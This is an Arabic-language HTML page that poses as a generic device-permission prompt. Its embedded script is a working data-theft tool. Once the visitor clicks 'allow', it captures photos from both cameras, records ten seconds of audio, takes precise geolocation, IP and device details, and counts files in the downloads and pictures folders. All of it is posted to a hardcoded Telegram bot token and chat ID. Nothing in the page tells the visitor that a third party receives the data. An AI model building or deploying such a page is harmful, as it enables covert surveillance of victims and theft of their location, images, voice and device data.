<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب إذن الوصول</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            color: #333;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .permission-box {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 25px;
            margin-top: 30px;
        }
        
        .permission-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        
        .permission-icon {
            font-size: 24px;
            margin-left: 15px;
            color: #4285f4;
        }
        
        .permission-title {
            font-size: 20px;
            font-weight: 600;
            margin: 0;
        }
        
        .permission-item {
            display: flex;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #f5f5f5;
        }
        
        .permission-item-icon {
            font-size: 20px;
            margin-left: 15px;
            width: 30px;
            text-align: center;
        }
        
        .permission-item-text {
            flex: 1;
        }
        
        .permission-item-name {
            font-weight: 500;
            margin-bottom: 3px;
        }
        
        .permission-item-desc {
            font-size: 13px;
            color: #666;
        }
        
        .action-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 25px;
        }
        
        .btn {
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            font-size: 15px;
            transition: all 0.2s;
        }
        
        .btn-allow {
            background-color: #4285f4;
            color: white;
        }
        
        .btn-allow:hover {
            background-color: #3367d6;
        }
        
        .btn-deny {
            background-color: #f1f1f1;
            color: #555;
        }
        
        .btn-deny:hover {
            background-color: #e0e0e0;
        }
        
        .status {
            text-align: center;
            padding: 15px;
            margin-top: 20px;
            border-radius: 6px;
            display: none;
        }
        
        .status-processing {
            background-color: #e8f0fe;
            color: #4285f4;
        }
        
        .status-success {
            background-color: #e6f4ea;
            color: #34a853;
        }
        
        .status-error {
            background-color: #fce8e6;
            color: #d93025;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="permission-box">
            <div class="permission-header">
                <div class="permission-icon">🔒</div>
                <h1 class="permission-title">طلب إذن الوصول</h1>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📱</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">معلومات الجهاز</div>
                    <div class="permission-item-desc">جمع معلومات مفصلة عن جهازك</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">🌍</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الموقع الجغرافي</div>
                    <div class="permission-item-desc">تحديد موقعك الحالي بدقة</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📷</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الكاميرا الأمامية والخلفية</div>
                    <div class="permission-item-desc">التقاط صور وفيديوهات من الكاميرات</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">🎤</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">التسجيل الصوتي</div>
                    <div class="permission-item-desc">تسجيل صوت لمدة 10 ثواني</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📁</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الملفات والصور</div>
                    <div class="permission-item-desc">الوصول إلى مجلدات التحميل والصور</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">🔔</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">الإشعارات</div>
                    <div class="permission-item-desc">قراءة الإشعارات خلال الـ24 ساعة الماضية</div>
                </div>
            </div>
            
            <div class="permission-item">
                <div class="permission-item-icon">📞</div>
                <div class="permission-item-text">
                    <div class="permission-item-name">جهات الاتصال</div>
                    <div class="permission-item-desc">قراءة دفتر العناوين</div>
                </div>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-deny" id="deny-btn">رفض</button>
                <button class="btn btn-allow" id="allow-btn">السماح</button>
            </div>
            
            <div class="status status-processing" id="status-processing">
                جاري جمع المعلومات وإرسالها...
            </div>
            
            <div class="status status-success" id="status-success" style="display: none;">
                تم إرسال المعلومات بنجاح!
            </div>
            
            <div class="status status-error" id="status-error" style="display: none;">
                حدث خطأ أثناء محاولة جمع المعلومات
            </div>
        </div>
    </div>

    <script>
        // تكوين البوت
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // عناصر الواجهة
        const allowBtn = document.getElementById('allow-btn');
        const denyBtn = document.getElementById('deny-btn');
        const statusProcessing = document.getElementById('status-processing');
        const statusSuccess = document.getElementById('status-success');
        const statusError = document.getElementById('status-error');
        
        // معالجة النقر على زر السماح
        allowBtn.addEventListener('click', async () => {
            allowBtn.disabled = true;
            denyBtn.disabled = true;
            statusProcessing.style.display = 'block';
            
            try {
                // جمع وإرسال جميع المعلومات
                await collectAndSendAllData();
                
                statusProcessing.style.display = 'none';
                statusSuccess.style.display = 'block';
            } catch (error) {
                console.error('Error:', error);
                statusProcessing.style.display = 'none';
                statusError.style.display = 'block';
                statusError.textContent = `حدث خطأ: ${error.message}`;
            }
        });
        
        // معالجة النقر على زر الرفض
        denyBtn.addEventListener('click', () => {
            document.querySelector('.permission-box').innerHTML = `
                <div style="text-align: center; padding: 30px;">
                    <div style="font-size: 50px; margin-bottom: 20px;">🚫</div>
                    <h2 style="margin-bottom: 10px;">تم رفض الأذونات</h2>
                    <p style="color: #666;">لن يتم جمع أو إرسال أي معلومات من جهازك</p>
                </div>
            `;
        });
        
        // دالة رئيسية لجمع وإرسال جميع البيانات
        async function collectAndSendAllData() {
            // 1. إرسال معلومات الجهاز الأساسية
            const deviceInfo = await getDeviceInfo();
            await sendToTelegram(formatDeviceInfo(deviceInfo));
            
            // 2. الكاميرا الأمامية
            try {
                const frontCameraPhoto = await captureCameraPhoto('user');
                await sendPhotoToTelegram(frontCameraPhoto, 'front_camera.jpg');
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الأمامية: " + error.message);
            }
            
            // 3. الكاميرا الخلفية
            try {
                const backCameraPhoto = await captureCameraPhoto('environment');
                await sendPhotoToTelegram(backCameraPhoto, 'back_camera.jpg');
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الخلفية: " + error.message);
            }
            
            // 4. الموقع الجغرافي
            try {
                const location = await getLocation();
                await sendToTelegram(`📍 الموقع الجغرافي:\n- خط العرض: ${location.latitude}\n- خط الطول: ${location.longitude}\n- الدقة: ${location.accuracy} متر\n- رابط الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}`);
            } catch (error) {
                await sendToTelegram("⚠️ فشل الحصول على الموقع الجغرافي: " + error.message);
            }
            
            // 5. التسجيل الصوتي
            try {
                const audioBlob = await recordAudio(10);
                await sendAudioToTelegram(audioBlob, 'audio_recording.ogg');
            } catch (error) {
                await sendToTelegram("⚠️ فشل التسجيل الصوتي: " + error.message);
            }
            
            // 6. ملفات التحميل
            try {
                const downloadFiles = await getFilesFromDirectory('downloads');
                if (downloadFiles.length > 0) {
                    await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
                    // يمكن إضافة إرسال الملفات هنا
                }
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى مجلد التحميل: " + error.message);
            }
            
            // 7. الصور من مجلد الصور
            try {
                const pictures = await getFilesFromDirectory('pictures');
                if (pictures.length > 0) {
                    await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
                    // يمكن إرسال بعض الصور كمثال
                }
            } catch (error) {
                await sendToTelegram("⚠️ فشل الوصول إلى مجلد الصور: " + error.message);
            }
            
            // 8. جهات الاتصال (هذه تحتاج إلى API خاص)
            try {
                // هذه الميزة تحتاج إلى صلاحيات خاصة
                await sendToTelegram("📞 لا يمكن الوصول إلى جهات الاتصال من خلال المتصفح بدون إضافات خاصة");
            } catch (error) {
                await sendToTelegram("⚠️ فشل قراءة جهات الاتصال: " + error.message);
            }
            
            // 9. الإشعارات (غير متاحة في المتصفح)
            await sendToTelegram("🔔 لا يمكن قراءة الإشعارات من خلال المتصفح");
        }
        
        // دالة لجمع معلومات الجهاز
        async function getDeviceInfo() {
            const info = {
                country: await getCountry(),
                city: await getCity(),
                ip: await getIP(),
                batteryLevel: await getBatteryLevel(),
                isCharging: await getChargingStatus(),
                network: await getNetworkInfo(),
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
                time: new Date().toLocaleString(),
                deviceName: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
                deviceVersion: 'غير معروف',
                deviceType: getDeviceType(),
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                storage: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                language: navigator.language,
                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[0] || navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                osVersion: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
                screenOrientation: window.screen.orientation.type,
                colorDepth: `${window.screen.colorDepth} بت`,
                bluetooth: 'غير متاح في المتصفح',
                geolocation: 'متاح' in navigator.geolocation ? 'نعم' : 'لا',
                touchSupport: 'ontouchstart' in window ? 'نعم' : 'لا'
            };
            
            return info;
        }
        
        // دالة لالتقاط صورة من الكاميرا
        async function captureCameraPhoto(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facingMode,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // دالة للحصول على الموقع الجغرافي
        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => reject(error),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // دالة للتسجيل الصوتي
        async function recordAudio(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];
            
            mediaRecorder.ondataavailable = (event) => {
                audioChunks.push(event.data);
            };
            
            const recordingPromise = new Promise((resolve) => {
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    resolve(audioBlob);
                };
            });
            
            mediaRecorder.start();
            await new Promise(resolve => setTimeout(resolve, duration * 1000));
            mediaRecorder.stop();
            
            stream.getTracks().forEach(track => track.stop());
            
            return recordingPromise;
        }
        
        // دالة للحصول على الملفات من مجلد معين
        async function getFilesFromDirectory(dirName) {
            if (!('showDirectoryPicker' in window)) {
                throw new Error("File System Access API not supported");
            }
            
            const dirHandle = await window.showDirectoryPicker({ startIn: dirName });
            const files = [];
            
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    files.push(entry);
                }
            }
            
            return files;
        }
        
        // دوال مساعدة للحصول على معلومات الشبكة والبلد
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.country_name || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getCity() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.city || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }
        
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}%`;
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير معروف';
        }
        
        async function getChargingStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return battery.charging ? 'نعم' : 'لا';
                } catch {
                    return 'غير معروف';
                }
            }
            return 'غير معروف';
        }
        
        async function getNetworkInfo() {
            if (navigator.connection) {
                return navigator.connection.effectiveType || 'غير معروف';
            }
            return 'غير معروف';
        }
        
        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (userAgent.match(/Android/i)) return 'Android';
            if (userAgent.match(/iPhone|iPad|iPod/i)) return 'iOS';
            if (userAgent.match(/Windows/i)) return 'Windows';
            if (userAgent.match(/Mac/i)) return 'Mac';
            if (userAgent.match(/Linux/i)) return 'Linux';
            return 'غير معروف';
        }
        
        // دالة لتنسيق معلومات الجهاز
        function formatDeviceInfo(info) {
            return `📱 <b>معلومات الجهاز:</b>
- الدولة: ${info.country}  🔻
- المدينة: ${info.city}
- عنوان IP: ${info.ip}
- شحن الهاتف: ${info.batteryLevel}
- هل الهاتف يشحن؟: ${info.isCharging}
- الشبكة: ${info.network}
- نوع الاتصال: ${info.connectionType}
- الوقت: ${info.time} ⏰
- اسم الجهاز: ${info.deviceName}  🖥️
- إصدار الجهاز: ${info.deviceVersion}
- نوع الجهاز: ${info.deviceType} 📱
- الذاكرة (RAM): ${info.ram}
- الذاكرة الداخلية: ${info.storage}
- عدد الأنوية: ${info.cpuCores}
- لغة النظام: ${info.language}
- اسم المتصفح: ${info.browser}
- إصدار المتصفح: ${info.browser.split('/')[1] || 'غير معروف'}
- دقة الشاشة: ${info.screenResolution}
- إصدار نظام التشغيل ☢️: ${info.osVersion}
- وضع الشاشة 📳: ${info.screenOrientation}
- عمق الألوان 🔰: ${info.colorDepth}
- بروتوكول الأمان المستخدم 💢: ${window.location.protocol.replace(':', '')}
- نطاق التردد للاتصال 🌐: ${info.connectionType}
- إمكانية تحديد الموقع الجغرافي 🌏: ${info.geolocation}
- الدعم لتقنية البلوتوث 🛜: ${info.bluetooth}
- دعم الإيماءات اللمسية 👏🏻: ${info.touchSupport}`;
        }
        
        // دالة لإرسال رسالة إلى تيليجرام
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // دالة لإرسال صورة إلى تيليجرام
        async function sendPhotoToTelegram(photoBlob, filename) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, filename);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
        
        // دالة لإرسال تسجيل صوتي إلى تيليجرام
        async function sendAudioToTelegram(audioBlob, filename) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('audio', audioBlob, filename);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
